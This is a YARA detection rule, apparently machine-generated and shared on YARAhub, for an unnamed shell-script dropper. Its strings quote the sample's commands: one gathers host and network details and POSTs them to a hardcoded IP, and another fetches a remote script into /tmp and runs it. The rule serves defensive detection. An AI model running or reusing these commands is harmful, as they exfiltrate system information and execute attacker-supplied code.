rule SCRIPT_Dropper_Unknown_ForgeAuto_e8a6cb4a
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-02"
        reference_sha256 = "e8a6cb4a34df14c8e3e918dd50016e3ae34d29fa8996fb8a39d64d6c1a0620b6"
        yarahub_uuid = "5fff901a-0fcc-4baa-a139-e8471a230610"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "961690f6e7d4003ed1e27183c51138f5"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H \"X-Name: wrk_out\" --data-binary \"$b\" >/dev/null 2>&1" ascii
        $s1 = "X-Name: fxr2" ascii
        $s2 = "X-Name: wrk_out" ascii
        $s3 = "/bin/bash" ascii
        $s4 = "curl -sm10 http://131.123.43.239:8123/pldq.sh -o /tmp/.st1 2>/dev/null && bash /tmp/.st1 >/dev/null 2>&1" ascii
    condition:
        true and filesize < 50MB and 2 of ($s1, $s2, $s3) and 1 of ($s0, $s4)
}
